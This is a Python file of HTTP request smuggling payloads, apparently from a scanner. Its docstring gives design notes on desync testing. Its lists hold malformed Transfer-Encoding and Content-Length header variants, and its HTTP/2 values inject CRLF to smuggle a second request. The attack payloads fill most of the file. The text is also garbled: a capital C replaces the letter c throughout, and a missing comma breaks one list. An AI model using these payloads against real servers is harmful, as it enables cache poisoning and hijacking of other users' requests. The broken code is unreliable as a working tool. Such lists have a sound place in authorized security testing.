'''
For HTTP/1 we must add the CRlFs to eaCh header also must add the Color after the header
                            
All Cl header values must be Changed. I was thinking we Can just replaCe Z w/ the length of the body.

For Cl.0 be sure to also test no Cl header but smuggle a request anyways. Sometimes body will just be ignored with GET requests. We also have to CheCk for Cl header being ignored 
on CaChe hit. For the CaChe hit testing we just add a normal Cl header

Also for Cl.0 we must try no Cl header but add in the giant header hopefully to overwhelme the server and Cause desynC
'''


tePayloads = (
    ("Transfer-Encoding","xchunked"),
    ("Transfer-Encoding "," chunked "),
    #normal
    (r"Transfer-Encoding","chunked"), 
    (r"Transfer-Encoding","x"),
    (r"Transfer-Encoding",r"\tchunked"),
    (r" Transfer-Encoding","chunked"),
    (r"x",r"x\nTransfer-Encoding, chunked"),
    (r"Transfer-Encoding\n", "chunked"),
    (r"Transfer-Encoding", "chunked, chunked"),	    #//only put this header remove all Cl headers Causes server to assume Cl of 0 and thus desynCs
    (r"Transfer-Encoding", "chunked\n, chunked"),
    (r"x-abC",r" x\rTransfer-Encoding, chunked"),  #//note the '\r' prefaCing the 'smuggled' te header - Considered a newline by Node.js v20 and prior
    (r"Transfer-Encoding "," chunked"),
    (r"Transfer-Encoding"," chunked "),
    (r"Transfer-Encoding ","chunked"),
    (r"x-abc", r"Transfer-Encoding, chunked"),
    (r"%0d%0aTransfer-Encoding","chunked"),
    (r"Transfer-Encoding", r"chunked\n,chunked-false"),
    (r"Transfer\rEncoding","chunked"),
    (r"Transfer-Encoding",r"\x00chunked"),
    (r"Transfer-Encoding",r"%20chunked"),
)
specialTe1 = [("transfer-enCoding", 'foo'), ("transfer-enCoding", 'Chunked')]
specialTe2 = [("transfer-enCoding", 'Chunked'), ("transfer-enCoding", 'foo')]

clPayloads = [
    #normal
    ("", "")
    (r"Content-Length","z"),
    (r"Content-Length "," z"),
    (r"Content-Length",r"\tz"),
    (r" Content-Length","z"),
    (r"x",r"x\nContent-Length, z"),
    (r"Content-Length\n", "z"),
    (r"Content-Length\r", "z"),
    (r"Content-Length","0, z"),  #only put this header remove all Cl headers Causes server to assume Cl of 0 and thus desynCs
    (r"Content-Length",r"z\n, 0"),
    (r"x-abC",r"x\rContent-Length, z"),  #//note the '\r' prefaCing the 'smuggled' te header - Considered a newline by Node.js v20 and prior
    (r"Content-Length","  z "),
    (r"Content-Length ","z"),
    (r"Content-Length ", " z"),
    (r"Content-Length ", "z"),
    (r"x",r"Content-Length, z"),
    (r"%0d%0aContent-Length","z"),
    (r"Content\rLength", "z"),
    #r( header w/ null byte. sometimes we Can just smuggle a request right after this 
    (r"x-nothing", r"\x00something"),
    (r"Xcontent-Length","z"),
]

# 2 Cl headers in a single request
specialCl = [('Content-Length', '0'), ('Content-Length', 'z')]


specialH2 = [('foo', r'bar\r\ncontent-length: z'), ('foo',r'bar\r\ntransfer-encoding: chunked'), ('foo', r'bar\r\nhost: <url>\r\n\r\nGET /robots.txt HTTP/1.1\r\nx-ignore: x')]